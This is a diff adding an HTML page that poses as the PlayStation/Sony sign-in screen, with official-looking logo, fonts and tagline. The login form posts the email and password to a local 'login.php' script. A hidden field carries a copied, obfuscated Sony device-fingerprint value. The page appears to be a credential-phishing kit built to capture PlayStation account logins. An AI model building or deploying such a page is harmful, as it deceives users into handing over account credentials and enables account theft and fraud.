@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en-GB">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign In | PlayStation</title>
+  <!-- Load Google Font: Poppins (Bold) -->
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@700&display=swap" rel="stylesheet">
+  <style>
+    /* === RESET & BASE === */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    html {
+      font-size: 16px;
+    }
+    body {
+      background: #000;
+      color: #fff;
+      font-family: "Helvetica Neue", Arial, sans-serif;
+      line-height: 1.5;
+      padding: 20px;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* === CONTAINER === */
+    .l-fixed {
+      width: 100%;
+      max-width: 400px;
+      background: #111;
+      border-radius: 8px;
+      padding: 24px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.6);
+    }
+
+    /* === PLAYSTATION SVG LOGO === */
+    .playstation-svg-logo {
+      display: block;
+      margin: 0 auto 16px; /* center + jarak ke teks bawah */
+      color: #fff;
+      width: 64px;
+      height: auto;
+    }
+
+    /* === LOGO TEXT === */
+    .item-logo {
+      text-align: center;
+      margin-bottom: 24px;
+    }
+    .playstation-logo {
+      font-family: 'Poppins', sans-serif;
+      font-weight: 700;
+      font-size: 32px;
+      letter-spacing: -0.8px;
+      color: #fff;
+      text-transform: none;
+      line-height: 1;
+    }
+
+    /* === DESCRIPTION === */
+    .description-small {
+      text-align: center;
+      font-size: 14px;
+      color: #ccc;
+      margin-bottom: 16px;
+      line-height: 1.4;
+    }
+
+    /* === FORM === */
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px 16px;
+      background: #222;
+      border: 1px solid #444;
+      border-radius: 4px;
+      color: #fff;
+      font-size: 16px;
+      outline: none;
+    }
+    input::placeholder {
+      color: #777;
+    }
+    input:focus {
+      border-color: #0070f3;
+      box-shadow: 0 0 0 2px rgba(0, 112, 243, 0.3);
+    }
+
+    /* === BUTTONS === */
+    .button {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      font-weight: bold;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      text-align: center;
+    }
+    .primary-button {
+      background: #0070f3;
+      color: white;
+    }
+    .primary-button:hover {
+      background: #005fce;
+    }
+    .secondary-button {
+      background: transparent;
+      color: #0070f3;
+      border: 1px solid #0070f3;
+    }
+    .secondary-button:hover {
+      background: rgba(0, 112, 243, 0.1);
+    }
+
+    /* === LINKS === */
+    .text-link button {
+      background: none;
+      border: none;
+      color: #0070f3;
+      text-decoration: underline;
+      font-size: 14px;
+      cursor: pointer;
+      padding: 0;
+      text-align: center;
+      margin: 8px 0;
+    }
+
+    /* === FOOTER === */
+    .l-footer {
+      margin-top: 24px;
+      text-align: center;
+      font-size: 12px;
+      color: #777;
+    }
+    .l-footer button {
+      background: none;
+      border: none;
+      color: #0070f3;
+      text-decoration: underline;
+      font-size: 12px;
+      cursor: pointer;
+    }
+
+    /* === RESPONSIVE === */
+    @media (max-width: 480px) {
+      .l-fixed {
+        padding: 16px;
+      }
+      .playstation-logo {
+        font-size: 28px;
+      }
+      .playstation-svg-logo {
+        width: 56px;
+        margin-bottom: 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="l-fixed">
+    <!-- TEKS LOGO "PlayStation" dengan font mirip resmi -->
+    <div class="item-logo">
+      <!-- SVG Logo PlayStation -->
+      <svg
+        class="playstation-svg-logo"
+        xmlns="http://www.w3.org/2000/svg"
+        viewBox="4.3 9.5 41.10000000000001 31"
+        aria-hidden="true"
+      >
+        <path
+          d="M5.8 32.1c-1.5 1-1 2.9 2.2 3.8 3.3 1.1 6.9 1.4 10.4.8.2 0 .4-.1.5-.1v-3.4l-3.4 1.1c-1.3.4-2.6.5-3.9.2-1-.3-.8-.9.4-1.4l6.9-2.4V27l-9.6 3.3c-1.2.4-2.4 1-3.5 1.8zm23.2-15v9.7c4.1 2 7.3 0 7.3-5.2 0-5.3-1.9-7.7-7.4-9.6C26 11 23 10.1 20 9.5v28.9l7 2.1V16.2c0-1.1 0-1.9.8-1.6 1.1.3 1.2 1.4 1.2 2.5zm13 12.7c-2.9-1-6-1.4-9-1.1-1.6.1-3.1.5-4.5 1l-.3.1v3.9l6.5-2.4c1.3-.4 2.6-.5 3.9-.2 1 .3.8.9-.4 1.4l-10 3.7V40L42 34.9c1-.4 1.9-.9 2.7-1.7.7-1 .4-2.4-2.7-3.4z"
+          fill="currentColor"
+        />
+      </svg>
+
+      <div class="playstation-logo">PlayStation™</div>
+    </div>
+
+    <!-- DESCRIPTION -->
+    <div class="description-small">Access many Sony group services, all with one sign-in ID.</div>
+
+    <!-- LOGIN FORM -->
+    <form method="POST" action="login.php" novalidate>
+      <input type="email" name="username" placeholder="Sign-In ID (Email Address)" required maxlength="63" autocomplete="on" />
+      <input type="password" name="password" placeholder="Password" required maxlength="30" autocomplete="off" />
+
+      <!-- Hidden field -->
+      <input type="hidden" name="nds-pmd" value='{"jvqtrgQngn":{"oq":"1536:735:1536:834:1536:834","wfi":"flap-131618","oc":"5q54s2p19323np12","fe":"1536k864 24","qvqgm":"-60","jxe":993765,"syi":"snyfr","si":"si,btt,zc4,jroz","sn":"sn,zcrt,btt,jni","us":"26rp5o5p2o5sq2po","cy":"Jva32","sg":"{\"zgc\":0,\"gf\":snyfr,\"gr\":snyfr}","sp":"{\"gp\":gehr,\"ap\":gehr}","sf":"gehr","jt":"s2nno0055p58o750","sz":"o65521rrr8ps0sos","vce":"apvc,0,5qo885r8,2,1;fg,0,rzore17,0,rzore19,0;zz,148,400,0,wf-FVRJF1yvo-urnqre-PbagragNern;zp,348,574,1o,wf-FVRJF1yvo-urnqre-PbagragNern;zzf,n1,0,n,1pp 249,4r13 74,r61,r64,-297sp,2rr50,-888;zp,87,561,27,wf-FVRJF1yvo-urnqre-PybfrVpba;zzf,361,3r8,n,81 0,3rq1 628s,197s,197p,-41q55,32o0r,1o1;zzf,3r8,3r8,n,1s48 5r1,2rp1 491,7r1,7q5,-13r48,1qn83,-6;zzf,3r8,3r8,n,42 75,42 75,q,q,-52s,54n,3;zzf,3r9,3r9,n,ABC;zzf,3r7,3r7,n,ABC;zzf,3r8,3r8,n,ABC;zzf,3r8,3r8,n,ABC;zzf,3r7,3r7,n,ABC;zzf,3r8,3r8,n,ABC;","ns":""},"jg":"1.j-666234.1.2.7nxd-7qzXYOl9-R-YxxlGj,,.YFwxxDmYK9vkRiK16qKZ_lNAsD8Tg79NfeiY7y1q4QGkPdUveGRI2nNsOqV9dqxbQL3q9efQsHtAILNZLcyMvo2QKp9aTgR9gY2LTQTPDDsf6CY8I-dFuATo8c1qlG8_Zo8C630JUBxB2LMazQ_I5w0GnnTQ-Di1obS30GUF7gI5F0356B7wpMOIzqatqKGh_hUXIYDmhBLxE9dGffZg56zYhiaxpqomSJRfr4uP4lT1TwdWxy8tygeWh6zT8K0j"}' />
+
+      <button type="submit" class="button primary-button">Sign In</button>
+    </form>
+
+    <!-- TROUBLE SIGNING IN? -->
+    <div class="text-link">
+      <button>Trouble Signing In?</button>
+    </div>
+
+    <!-- CREATE NEW ACCOUNT -->
+    <div style="text-align: center; margin-top: 12px;">
+      <button class="button secondary-button">Create New Account</button>
+    </div>
+
+    <!-- FOOTER -->
+    <div class="l-footer">
+      <button>Terms / Privacy / Help</button>
+    </div>
+  </div>
+</body>
+</html>
